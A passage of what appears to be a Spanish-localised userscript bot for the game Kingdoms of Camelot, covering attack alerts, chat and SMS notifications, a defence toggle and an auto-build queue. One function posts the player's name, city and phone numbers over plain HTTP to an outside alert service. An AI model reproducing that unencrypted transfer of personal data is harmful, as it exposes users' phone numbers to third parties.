      myselect.add(addoption, null) //add new option to end of "Providers"
     }
    }
	myselect.disabled = false;
   },

  setProvider : function(){
    var ddProvider = document.getElementById("pbfrmprovider").wrappedJSObject;
     Options.celltext.provider=ddProvider.options[ddProvider.selectedIndex].value;
	if(ddProvider.selectedIndex > 0){
		document.getElementById("pbnum1").disabled = false;
		document.getElementById("pbnum2").disabled = false;
		document.getElementById("pbnum3").disabled = false;
	} else {
		document.getElementById("pbnum1").disabled = true;
		document.getElementById("pbnum2").disabled = true;
		document.getElementById("pbnum3").disabled = true;
	}
    //alert(Options.celltext.provider);
   },

  e_swfLoaded : function (){
    var t = Tabs.tower;
    document.getElementById('pbLoadingSwf').style.display = 'none';
    document.getElementById('pbSoundOpts').style.display = 'inline';
    t.volSlider.setValue (Options.alertSound.volume/100);
    t.loadUrl (Options.alertSound.soundUrl);
    setTimeout (function (){t.mss.setVolume (1, Options.alertSound.volume);}, 500);
    if (Options.alertSound.alarmActive && Options.alertSound.expireTime>unixTime())
      t.soundTheAlert();
  },

  e_alertOptChanged : function (){
    var t = Tabs.tower;
    Options.alertConfig.aChat = document.getElementById('pbalertEnable').checked;
    Options.alertConfig.aPrefix=document.getElementById('pbalertPrefix').value;
    Options.alertConfig.scouting=document.getElementById('pbalertScout').checked;
    Options.alertConfig.wilds=document.getElementById('pbalertWild').checked;
	Options.alertConfig.defend=document.getElementById('pbalertDefend').checked;
	Options.alertConfig.raid=document.getElementById('pbalertraid').checked;
    var mt = parseInt(document.getElementById('pbalertTroops').value);
    if (mt<1 || mt>120000){
      document.getElementById('pbalertTroops').value = Options.alertConfig.minTroops;
      document.getElementById('pbalerterr').innerHTML = '<font color=#600000><B>INVALID</b></font>';
      setTimeout (function (){document.getElementById('pbalerterr').innerHTML =''}, 2000);
      return;
    }
    Options.alertConfig.minTroops = mt;
	saveOptions();
  },

  e_volChanged : function (val){
    var t = Tabs.tower;
    document.getElementById('pbVolOut').innerHTML = parseInt(val*100);
    Options.alertSound.volume = parseInt(val*100);
    t.mss.setVolume (1, Options.alertSound.volume);
  },

  butToggleDefMode : function (cityId){
    var t = Tabs.tower;
    var mode = 1;
    if (Seed.citystats["city" + cityId].gate != 0)
      mode = 0;
    t.ajaxSetDefMode (cityId, mode, function (newMode){
        t.defMode[cityId] = newMode;
        t.displayDefMode (cityId);
      });
  },

  displayDefMode : function (cityId){
    var t = Tabs.tower;
    var but = document.getElementById('pbtabut_'+ cityId);
    if (t.defMode[cityId]){
      but.className = 'pbDefButOn';
      but.value = 'Def = ON';
    } else {
      but.className = 'pbDefButOff';
      but.value = 'Def = OFF';
        }
	},

  eachSecond : function (){
		 var t = Tabs.tower;
		  for (var cityId in Cities.byID){
			  if (Seed.citystats["city" + cityId].gate != t.defMode[cityId]){     // user changed def mode
				t.defMode[cityId] = Seed.citystats["city"+ cityId].gate;
				t.displayDefMode (cityId);
			  }
		  Options.alertConfig.raidautoswitch[cityId] = false;
		  }
		var now = unixTime();
		var incomming = false;
			if (matTypeof(Seed.queue_atkinc) != 'array'){
		  for (var k in Seed.queue_atkinc){   // check each incoming march
					var m = Seed.queue_atkinc[k];
					if ((m.marchType==3 || m.marchType==4) && parseIntNan(m.arrivalTime)>now){
			  if (m.departureTime > Options.alertConfig.lastAttack){
				Options.alertConfig.lastAttack = m.departureTime;
				t.newIncoming (m);
			  }
				incomming = true;
				if (Options.alertConfig.raid){
					Options.alertConfig.raidautoswitch[m.toCityId] = true;
				}
			}
		  }
	}
    if (Options.alertSound.alarmActive && (now > Options.alertSound.expireTime))
      t.stopSoundAlerts();

        t.towerMarches = [];
        for (var i = 0; i < Cities.cities.length; i++) {
            var cId = Cities.cities[i].id;
            t['attackCount_' + cId] = 0;
            t['scoutCount_' + cId] = 0;
        }
        if (matTypeof(Seed.queue_atkinc) != 'array') {
            for (var k in Seed.queue_atkinc) {
                var m = Seed.queue_atkinc[k];
                if ((m.marchType == 3 || m.marchType == 4) && parseIntNan(m.arrivalTime) > now) {
                    t.handleTowerData(m);

                }
            }
        }
        for (var i = 0; i < Cities.cities.length; i++) {
            var cId = Cities.cities[i].id;
            document.getElementById('pbattackqueue_' + cId).value = 'A ' + t['attackCount_' + cId] + ' | S ' + t['scoutCount_' + cId];
        }


     },

  e_soundFinished : function (chan){ // called by SWF when sound finishes playing
	var t = Tabs.tower;
    if (chan != 1)
      return;
    if (!Options.alertSound.alarmActive){
      document.getElementById('pbSoundStop').disabled = true;
    }
  },

  e_soundFileLoaded : function (chan, isError){ // called by SWF when sound file finishes loading
    if (chan != 1)
      return;
    if (isError)
      document.getElementById('pbLoadStat').innerHTML = '<FONT COLOR=#660000>ERROR:Debes recargar el archivo por defecto, o en su defecto cambiar la dirección del archivo de sonido</font>!';
    else
      document.getElementById('pbLoadStat').innerHTML = 'Cargado';
  },

  playSound : function (doRepeats){
    var t = Tabs.tower;
    document.getElementById('pbSoundStop').disabled = false;
    clearTimeout (t.soundStopTimer);
    clearTimeout (t.soundRepeatTimer);
    t.mss.play (1, 0);
    t.soundStopTimer = setTimeout (function(){t.mss.stop(1); t.e_soundFinished(1)}, Options.alertSound.playLength*1000);
    if (doRepeats && Options.alertSound.repeat)
      t.soundRepeatTimer = setTimeout (function (){t.playSound(true)}, Options.alertSound.repeatDelay*60000);
    else
      Options.alertSound.alarmActive = false;
  },

  soundTheAlert : function (){
    var t = Tabs.tower;
    Options.alertSound.alarmActive = true;
    t.playSound(true);
  },

  stopSoundAlerts : function (){
    var t = Tabs.tower;
    t.mss.stop (1);
    clearTimeout (t.soundStopTimer);
    clearTimeout (t.soundRepeatTimer);
    document.getElementById('pbSoundStop').disabled = true;
    Options.alertSound.alarmActive = false;
    Options.alertSound.expireTime = 0;
  },

  newIncoming : function (m){
    var t = Tabs.tower;
	    t.postToChat (m);
  },

  sendalert : function (m){
    var t = Tabs.tower;
    var now = unixTime();
    if (Options.celltext.atext)
      t.postToCell (m);
    if (Options.alertSound.enabled){
      t.soundTheAlert(m);
      if (m.arrivalTime > Options.alertSound.expireTime)
        Options.alertSound.expireTime = m.arrivalTime;
    }
	if (Options.alertConfig.raid){
		Tabs.Raid.StopCityRaids(m.toCityId);
		Options.alertConfig.raidautoswitch[m.toCityId] = true;
	}
  },

  ajaxSetDefMode : function (cityId, state, notify){
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.cid = cityId;
		params.state = state;
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				if (rslt.ok) {
					Seed.citystats["city" + cityId].gate = state;
					notify (state);
				}
			},
			onFailure: function () {
			}
		})
	},

  onUnload : function (){
	},



  postToCell : function (m){
    var t = Tabs.tower;
    var data = {};
    if (m.marchType == null)      // bogus march (returning scouts)
      return;
    if (m.marchType == 3){
      if (!Options.alertConfig.scouting)
        return;
      data.atkType = 'explorado';
    } else if (m.marchType == 4){
      data.atkType = 'atacado';
    } else {
      return;
    }
    var city = Cities.byID[m.toCityId];
    if ( city.tileId == m.toTileId )
      data.target = 'ciudad ('+ city.x +','+ city.y+')';
    else {
      if (!Options.alertConfig.wilds)
        return;
      data.target = 'tierra';
      for (k in Seed.wilderness['city'+m.toCityId]){
        if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
          data.target += Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
          break;
        }
      }
    }
    if (Seed.players['u'+m.pid])
      data.who = Seed.players['u'+m.pid].n;
    else if (m.players && m.players['u'+m.pid])
      data.who = m.players['u'+m.pid].n;
    else
      data.who = 'Desconocido';

    if (m.fromXCoord)
      data.who += m.fromXCoord +','+ m.fromYCoord;
     data.arrival = unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime()));
    var totTroops = 0;
    data.totTroops = ' '
    for (k in m.unts){
      var uid = parseInt(k.substr (1));
      data.totTroops += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
      totTroops += m.unts[k];
    }
    if (totTroops < Options.alertConfig.minTroops)
      return;


    if ( city.tileId == m.toTileId ){
      var emb = getCityBuilding(m.toCityId, 8);
      if (emb.count > 0){
        var availSlots = emb.maxLevel;
        for (k in Seed.queue_atkinc){
          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
            --availSlots;
          }
        }
        data.embassy = 'EMBAJADA '+ availSlots +'de'+ emb.maxLevel;
        if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
        {
            data.stat = 'REFUGIADO';
        }
        if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
        {
            data.stat = 'DEFENDIENDO';
        }
      }
    }
    data.provider = Options.celltext.provider;
    data.num1 = Options.celltext.num1;
    data.num2 = Options.celltext.num2;
    data.num3 = Options.celltext.num3;
    data.serverId = getServerId();
    data.player = Seed.player['name'];
    data.city = city.name;

  GM_xmlhttpRequest({
    method: 'POST',
    url: 'http://hs151.digitalweb.net/index.php',
	headers: {
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    },
	data: implodeUrlArgs(data),

	})
  },

  postToChat : function (m){
	var t = Tabs.tower;
    if (DEBUG_TRACE) logit ("checkTower(): LLEGADA EN "+ unixTime()  +": \n"+ inspect (m, 8, 1));
    if (m.marchType == null)      // bogus march (returning scouts)
      return;
    if (ENABLE_TEST_TAB) Tabs.Test.addDiv ("Llegando!<BR><PRE style='margin:0px;'>" + inspect (m, 8, 1) +'</pre>');
    if (m.marchType == 3){
      if (!Options.alertConfig.scouting)
        return;
      atkType = 'EXPLORADA';
	  atkTypea = 'explorando';
    } else if (m.marchType == 4){
      atkType = 'ATACADA';
	  atkTypea = 'atacando';
    } else {
      return;
         }
    var target, atkType, who;
    var city = Cities.byID[m.toCityId];
    var cityNames = Cities.byID[m.toCityId].name;
	if ( city.tileId == m.toTileId ){
      target = 'ciudad ' + cityNames + ' en '+ city.x +','+ city.y;
        }
        else {
      if (!Options.alertConfig.wilds)
        return;
      target = 'tierra';
      for (k in Seed.wilderness['city'+m.toCityId]){
        if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
          target += ' en '+ Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
          break;
        }
      }
    }
    if (Seed.players['u'+m.pid])
      who = Seed.players['u'+m.pid].n;
    else if (m.players && m.players['u'+m.pid])
      who = m.players['u'+m.pid].n;
    else
      who = 'Unknown';

    if (m.fromXCoord)
      who += ' desde '+ m.fromXCoord +','+ m.fromYCoord;
  	who += ' ('+getDiplomacy(m.aid)+')';

    var msg = Options.alertConfig.aPrefix +' ';
	if(m.marchStatus == 9)
		msg += 'The '+ atkType +' on my '+ target +' by '+ who +' has been recalled.';
	else {
    msg += 'Mi '+ target +' esta siendo '+ atkType  +' por '+ who +' . Las Tropas llegan en '+
        unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +' ';
    msg +='Tropas '+ atkTypea  +' :';
	}
  var totTroops = 0;
    for (k in m.unts){
      var uid = parseInt(k.substr (1));
      msg += addCommasWhole1(m.unts[k]) +' '+ unsafeWindow.unitcost['unt'+uid][0] +',';
      totTroops += m.unts[k];
    }
    if (totTroops < Options.alertConfig.minTroops)
      return;
    msg = msg.slice (0, -2);
    msg += '.';
    if ( city.tileId == m.toTileId ){
      var emb = getCityBuilding(m.toCityId, 8);
      if (emb.count > 0){
        var availSlots = emb.maxLevel;
        for (k in Seed.queue_atkinc){
          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
            --availSlots;
          }
        }
        if ( emb.maxLevel == 0 )
			msg += ' Esta ciudad no posee embajada';
		/*if ( availSlots == emb.maxLevel ) {
			msg += ' Mi Embajada tiene '+ emb.maxLevel +' plazas, y esta completa ';
		} else {*/
			msg += ' Mi Embajada tiene '+ availSlots +' plazas disponibles de '+ emb.maxLevel +'. ';
		//}
		if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
        {
            msg+= ' Mis tropas estan REFUGIADAS!';
        }
        if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
        {
            msg+= ' Mis tropas estan DEFENDIENDO!';
        }
	  }
    }
	t.sendalert(m);
    if (!Options.alertConfig.aChat) return;
	if (ENABLE_TEST_TAB) Tabs.Test.addDiv (msg);
    if (SEND_ALERT_AS_WHISPER)
      sendChat ("/"+ Seed.player.name +' '+ msg);    // Whisper to myself
    else
		sendChat ("/a "+  msg);                        // Alliance chat
	},
	      handleTowerData: function(m){
        var t = Tabs.tower;
        var now = unixTime();
        var target, atkType, who, attackermight, allianceId, allianceName, diplomacy;
        var city = Cities.byID[m.toCityId];

        if (DEBUG_TRACE)
            logit("checkTower(): Llegan en " + unixTime() + ": \n" + inspect(m, 8, 1));

        //ATKTYPE
        if (m.marchType == 3) {
            atkType = 'explorada';
            t['scoutCount_' + m.toCityId]++;
        }
        else
            if (m.marchType == 4) {
                atkType = 'atacada';
                t['attackCount_' + m.toCityId]++;
            }
            else {
                return;
            }
        //TARGET
        if (city.tileId == m.toTileId)
            target = 'Ciudad ' + city.x + ',' + city.y;
        else {
            target = 'Tierra';
            for (k in Seed.wilderness['city' + m.toCityId]) {
                if (Seed.wilderness['city' + m.toCityId][k].tileId == m.toTileId) {
                    target += ' en ' + Seed.wilderness['city' + m.toCityId][k].xCoord + ',' + Seed.wilderness['city' + m.toCityId][k].yCoord;
                    break;
                }
            }
        }
        //CITYNAME
        var cityName = Cities.byID[m.toCityId].name;

        //TROOPS
        var units = [];
        for (i = 0; i < 13; i++)
            units[i] = 0;
        for (k in m.unts) {
            var uid = parseInt(k.substr(1));
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Trop. Suminis.')
                units[1] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Milicianos')
                units[2] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Exploradores')
                units[3] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Piqueros')
                units[4] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Espadachines')
                units[5] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Arqueros')
                units[6] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Caballeria L.')
                units[7] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Caballeria P.')
                units[8] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Carreta S.')
                units[9] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Ballistas')
                units[10] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Arrietes')
                units[11] = m.unts[k];
            if (unsafeWindow.unitcost['unt' + uid][0] == 'Catapultas')
                units[12] = m.unts[k];
        }
        //ATTACKERS INFORMATION
        if (Seed.players['u' + m.pid]) {
            who = Seed.players['u' + m.pid].n;
            attackermight = Seed.players['u' + m.pid].m;
            allianceId = Seed.players['u' + m.pid].a;
            allianceName = Seed.allianceNames[allianceId];
            diplomacy = getDiplomacy(allianceId);
        }
        else
            if (m.players && m.players['u' + m.pid]) {
                who = m.players['u' + m.pid].n;
                attackermight = parseInt(m.players['u' + m.pid].m);
                allianceId = 'a' + m.players['u' + m.pid].a;
                allianceName = Seed.allianceNames[allianceId];
                diplomacy = getDiplomacy(allianceId);
            }
            else {
                who = 'n.A.';
                attackermight = 'n.A.';
                allianceId = 'n.A.';
                allianceName = 'n.A.';
                diplomacy = 'n.A.';
            }
		//SOURCE
        if (m.fromXCoord)
            var source = m.fromXCoord + ',' + m.fromYCoord;
        else
            var source = 'n.A.';

        var arrivingDatetime = new Date();
        arrivingDatetime.setTime(m.arrivalTime * 1000);
        var count = t.towerMarches.length + 1;
        t.towerMarches[count] = {
            added: now,
            cityId: m.toCityId,
            target: target,
            arrival: parseIntNan(m.arrivalTime),
            atkType: atkType,
            who: who,
            attackermight: attackermight,
            allianceName: allianceName,
            diplomacy: diplomacy,
            rtime: unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())),
            arrivingDatetime: arrivingDatetime,
			source:source,
            units: units,
        };
    },
    showTowerIncoming: function(cityId){
        var t = Tabs.tower;
        var popTowerIncoming = null;
        var cityName = Tabs.build.getCityNameById(cityId);

        if (t.popTowerIncoming == null) {
            t.popTowerIncoming = new CPopup('pbtower_' + cityId, 0, 0, 950, 500, true, function() {clearTimeout (t.timer);});
        }
        t.popTowerIncoming.show(false);
        var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbTabPad" id="pbCityTowerContent">';
        t.popTowerIncoming.getMainDiv().innerHTML = '</table></div>' + m;
        t.popTowerIncoming.getTopDiv().innerHTML = '<TD width="200px"><B>Reporte Torre de ' + cityName + '</b></td></td>';
        t.addCityData2Pop(cityId);
        t.popTowerIncoming.show(true);
		clearTimeout (t.timer);
		t.timer = setTimeout (function() {t.showTowerIncoming(cityId)}, 5000);
    },
    addCityData2Pop: function(cityId){
        var t = Tabs.tower;
        var rownum = 0;
        var names = ['Trop Sumin.', 'Milicianos.', 'Exploradores.', 'Piqueros.', 'Espadachines.', 'Arqueros.', 'C.Ligera', 'C.Pesada', 'Carretas', 'Ballistas', 'Arrietes', 'Catapultas'];
        enc = {};
        numSlots = 0;
        var row = document.getElementById('pbCityTowerContent').innerHTML = "";
        if (matTypeof(Seed.queue_atkinc) != 'array') {
            for (k in Seed.queue_atkinc) {
                march = Seed.queue_atkinc[k];
                if (march.marchType == 2) {
                    ++numSlots;
                    city = march.toCityId;
                    from = march.fromPlayerId;
					if (!enc[city])
                        enc[city] = {};
                    if (!enc[city][from])
                        enc[city][from] = [];
                    k = [];
                    k[0] = parseInt(march.knightCombat);
                    for (i = 1; i < 13; i++) {
                        if (Options.encRemaining)
                            k[i] = parseInt(march['unit' + i + 'Return']);
                        else
                            k[i] = parseInt(march['unit' + i + 'Count']);
                    }
					k[14] = parseInt(march.marchStatus);
					var now = unixTime();
					k[15] = parseInt(march.destinationUnixTime) - now;
                    enc[city][from].push(k);
                }
            }
        }
        var s1 = '';
		var s2 = '';
		var s3 = '';
		var tot = [];
        var atk = [];
        for (i = 0; i < 13; i++) {
            tot[i] = 0;
            atk[i] = 0;
        }

            s1 += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;} .attack{background:#FF9999;} .own{background:#66FF66;}</style>';
            s1 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=center width=16%></td>';

            for (k = 0; k < names.length; k++)
                s1 += '<TD width=7%><B>' + names[k] + '</b></td>';
            s1 += '</tr>';
            dest = cityId;
            if (enc[dest]) {
                for (p in enc[dest]) {
                    try {
                        player = Seed.players['u' + p].n;
                    }
                    catch (err) {
                        player = '???';
                    }
                    for (m = 0; m < enc[dest][p].length; m++) {
                        /*knight = '';
                        if (enc[dest][p][m][0] > 0)
                            knight = ' (' + enc[dest][p][m][0] + ')';
						*/
						status = '';
                        if (enc[dest][p][m][14] == 1) {
						    status = ' (' + timestr(enc[dest][p][m][15]) + ')';
							if (enc[dest][p][m][15] < 0)
								status = ' (enc)';
							else
								 status = ' (' + timestr(enc[dest][p][m][15]) + ')';
						}
						if (enc[dest][p][m][14] == 2) {
						    status = ' (enc)';
						}

                        s1 += '<TR align=right><TD align=left class="city">' + player + status +'</td>'
                        for (i = 1; i < 13; i++) {
                            num = enc[dest][p][m][i];
                            s1 += '<TD class="city">' + addCommasWhole1(num) + '</td>';
                            tot[i] += num;
                        }
                        //s1 += '<TD><INPUT id=sendhome_' + numSlots + ' type=submit value="Home" style="border:1px solid black; background-color:red;"></td></tr>';
                    }
                }
            } else {
                s1 += '<TR align=right><TD align=left class="city"><B>Refuerzos:</b></td>'
                for (i = 1; i < 13; i++) {
                    s1 += '<TD class="city">0</td>';
                }

            }
			s1 += '<TR align=right><TD colspan=14><BR></tr>';
            s1 += '<TR align=right><TD class="own" align=left><B>Tropas Propias:</b></td>';
            //OWNTROOPS
            var ownTroops = "";
            for (r = 1; r < 13; r++) {
                cityString = 'city' + cityId;
                num = parseInt(Seed.units[cityString]['unt' + r]);
                s1 += '<TD class="own">' + addCommasWhole1(num) + '</td>';
                tot[r] += num;
            }
            s1 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>Defensores:</b></td>';
            for (i = 1; i < 13; i++)
                s1 += '<TD class="tot">' + addCommasWhole1(tot[i]) + '</td>';
			s3 += '</tr></table>';

        s3 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>Ataques entrantes:</b></td>';

        var names = ['T.Sumn.', 'Milic.', 'Explo.', 'Pique.', 'Espa.', 'Arque.', 'Cab.L.', 'Cab.P', 'Carre.', 'Balli.', 'Arri.', 'Catap.'];
        if (t.towerMarches.length > 0) {
            for (k in t.towerMarches) {
                if (typeof t.towerMarches[k].atkType != 'undefined') {
                    if (t.towerMarches[k].cityId == cityId) {
                        s3 += '<TABLE cellspacing=0 width=100%><TR>';

                        if (t.towerMarches[k].atkType == 'atacado') {
                            s3 += '<TD rowspan=2 width=5%><B><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_30.jpg?6545"></b></td>';
                        }
                        else
                            if (t.towerMarches[k].atkType == 'explorado') {
                                s3 += '<TD rowspan=2 width=5%><B><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_30.jpg?6545"></b></td>';
                            }
                        s3 += '<TD width=15%  ><B>Ubicación</b></td>';
                        s3 += '<TD width=15%  ><B>Nombre</b></td>';
						s3 += '<TD width=10%><B>Origen: </b></td><TD width=10%>' + t.towerMarches[k].source + '</td>';
                        s3 += '<TD width=10%><B>Poderio: </b></td><TD width=10%>' + t.towerMarches[k].attackermight + '</td>';
                        s3 += '<TD width=10%><B>Alianza: </b></td><TD width=10%>' + t.towerMarches[k].allianceName + '</td>';
                        s3 += '<TD width=10%><B>Estado: </b></td><TD width=10%>' + t.towerMarches[k].diplomacy + '</td></tr>';
                        s3 += '<TR><TD width=10%  >' + t.towerMarches[k].target + '</td>';
                        s3 += '<TD  >' + t.towerMarches[k].who + '</td>';
                        s3 += '<TD><B>Restantes: </b></td><TD width=10%>' + t.towerMarches[k].rtime + '</td>';
                        s3 += '<TD><B>Llegada: </b></td><TD  colspan=5 width=10%>' + t.towerMarches[k].arrivingDatetime + '</td></tr>';
                        s3 += '</tr></table>';
                        s3 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=left width=16%></td>';
                        for (n = 0; n < names.length; n++)
                            s3 += '<TD width=7%><B>' + names[n] + '</b></td>';
                        s3 += '</tr><TR align=right><TD class="attack" align=left><B>Unidades:</td>';
                        for (u = 1; u < 13; u++) {
                            num = t.towerMarches[k].units[u];
                            s3 += '<TD class="attack">' + addCommasWhole1(num) + '</td>';
                            atk[u] += parseInt(num);
                        }
						s3 += '</tr></table>';
                    }
                }

            }
        }
		s2 += '<TR><TD colspan=14><BR></td></tr><TR align=right><TD class="attack" align=left><B>Atacantes:</b></td>';
        for (a = 1; a < 13; a++)
            s2 += '<TD class="attack" width=7%>' + addCommasWhole1(atk[a]) + '</td>';
		var html = s1 + s2 + s3;
        document.getElementById('pbCityTowerContent').innerHTML = html;

    },
    sendReinforcmentHome: function(){ //FUNCTION NOT IN USE YET BUT SOON :-)
        //mid, cid, fromUid, fromCid, upkeep
        var params = Object.clone(g_ajaxparams);
        params.mid = mid;
        params.cid = cid;
        params.fromUid = fromUid;
        params.fromCid = fromCid;
        new Ajax.Request(g_ajaxpath + "ajax/kickoutReinforcements.php" + g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function(transport){
                var rslt = eval("(" + transport.responseText + ")");
                if (rslt.ok) {
                    Modal.showAlert(g_js_strings.kickout_allies.troopshome);
                    seed.resources["city" + currentcityid].rec1[3] = parseInt(seed.resources["city" + currentcityid].rec1[3]) - upkeep;
                    if (parseInt(fromUid) == parseInt(tvuid)) {
                        var curmarch = seed.queue_atkp["city" + fromCid]["m" + mid];
                        var marchtime = Math.abs(parseInt(curmarch.destinationUnixTime) - parseInt(curmarch.eventUnixTime));
                        curmarch.returnUnixTime = unixTime() + marchtime;
                        curmarch.marchStatus = 8
                    }
                    delete seed.queue_atkinc["m" + mid]
                }
                else {
                    Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
                }
            },
            onFailure: function(){
            }
        })
    },
}


/****************************  Build Implementation  ******************************
 TODO:
	 visu directly in the game of build queue elements
	 <span class="leveltag" style="left:60px;">10</span>
	 more todos within the code
 */
Tabs.build = {
    tabOrder: 1,
    tabLabel: 'Contruir',
    myDiv: null,
    timer: null,
    buildTab: null,
    koc_buildslot: null,
    currentBuildMode: null,
    buildStates: [],
	loaded_bQ: [],
	lbQ: [],

    init: function(div){
        var t = Tabs.build;
        t.myDiv = div;
        t.koc_buildslot = unsafeWindow.buildslot; //save original koc function
        t.currentBuildMode = "build";
		t.buildStates = {
            running: false,
			help: false,
        };
        t.readBuildStates();

        for (var i = 0; i < Cities.cities.length; i++) {
            t["bQ_" + Cities.cities[i].id] = JSON2.parse(GM_getValue('bQ_' + getServerId() + '_' + Cities.cities[i].id, '[]'));
			if (typeof t["bQ_" + Cities.cities[i].id] == 'undefined' || (t["bQ_" + Cities.cities[i].id]) == "") {
				t["bQ_" + Cities.cities[i].id] = [];
			}
        }

        var m = '<DIV id=pbBuildDivF class=pbStat>FUNCIONES DE CONSTRUCCIÓN</div><TABLE id=pbbuildfunctions width=100% height=0% class=pbTab><TR>';
        if (t.buildStates.running == false) {
            m += '<TD><INPUT id=pbBuildRunning type=submit value=" Auto Construir = OFF "></td>';
        }
        else {
            m += '<TD><INPUT id=pbBuildRunning type=submit value=" Auto Construir = ON "></td>';
        }
		m += '<TD><INPUT id=pbBuildMode type=submit value=" Modo Construir = OFF "></td>';
		m += '<TD>Modo Construcción: <SELECT id="pbBuildType">';
		m += '<OPTION value=build> Subir nivel </option>';
		m += '<OPTION value=max> level max </option>';
		m += '<OPTION value=destruct> Destruir </option>';
		m += '</select></td>';
		m += '<TD><INPUT id=pbHelpRequest type=checkbox '+ (t.buildStates.help?' CHECKED':'') +'\></td><TD>¿Pedir Ayuda?</td>';
		m += '<TD><INPUT id=pbHelp type=submit value="Ayuda"></td>';
		m += '</tr></table></div>';
        m += '<DIV id=pbBuildDivQ class=pbStat>COLAS DE CONSTRUCCIÓN</div><TABLE id=pbbuildqueues width=100% height=0% class=ptentry><TR>';
		for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><B>' + Cities.cities[i].name + '</b></center></td>';
        }
		m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><INPUT id=pbbuild_' + Cities.cities[i].id + ' type=submit value="Ver"></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><INPUT id=pbCancelAll_' + Cities.cities[i].id + ' type=submit value="Cancelar Todo"></center></td>';
        }
        m += '</tr><TR>';
        
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD>En Cola:</td><TD id=pbbuildcount_' + Cities.cities[i].id + '>' + t["bQ_" + Cities.cities[i].id].length + '</td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            t['totalTime_' + Cities.cities[i].id] = 0;
            cbQ = t["bQ_" + Cities.cities[i].id];
            if (typeof cbQ != 'undefined') {
                for (var j = 0; j < cbQ.length; j++) {
                    t['totalTime_' + Cities.cities[i].id] = parseInt(t['totalTime_' + Cities.cities[i].id]) + parseInt(cbQ[j].buildingTime);
                }
                timestring = timestr(t['totalTime_' + Cities.cities[i].id]);
            }
            m += '<TD>Tiempo t.:</td><TD id=pbbuildtotal_' + Cities.cities[i].id + '>' + timestring + '</td>';
        }
        m += '</tr></table><SPAN class=boldRed id=pbbuildError></span>';
        t.myDiv.innerHTML = m;

        for (var i = 0; i < Cities.cities.length; i++) {
            var cityId = Cities.cities[i].id;
            var btnName = 'pbbuild_' + cityId;
            addQueueEventListener(cityId, btnName);
            var btn2Name = 'pbCancelAll_' + cityId;
            CancelAllEventListener(cityId, btn2Name);
			t.showBuildQueue(cityId, false);
        }

        t.e_autoBuild(); //start checking if we can build someting

		document.getElementById('pbBuildType').addEventListener('change', function(){t.setBuildMode(this.value);}, false);
		document.getElementById('pbBuildRunning').addEventListener('click', function(){
            t.toggleStateRunning(this);
        }, false);
		document.getElementById('pbBuildMode').addEventListener('click', function(){
            t.toggleStateMode(this);
        }, false);
		document.getElementById('pbHelp').addEventListener('click', function(){t.pbHelp();} , false);
		document.getElementById('pbHelpRequest').addEventListener ('change', function (){
			t.buildStates.help = (document.getElementById('pbHelpRequest').checked);
			t.saveBuildStates();
        }, false);

		window.addEventListener('unload', t.onUnload, false);

        function addQueueEventListener(cityId, name){
            document.getElementById(name).addEventListener('click', function(){
                t.showBuildQueue(cityId, true);
            }, false);
        }
        
        function CancelAllEventListener(cityId, name){
            document.getElementById(name).addEventListener('click', function(){
            	t["bQ_" + cityId] = [];
            	t['totalTime_' + cityId] = 0;
            	document.getElementById('pbbuildcount_' + cityId).innerHTML = 0;
            	document.getElementById('pbbuildtotal_' + cityId).innerHTML = timestr(0);
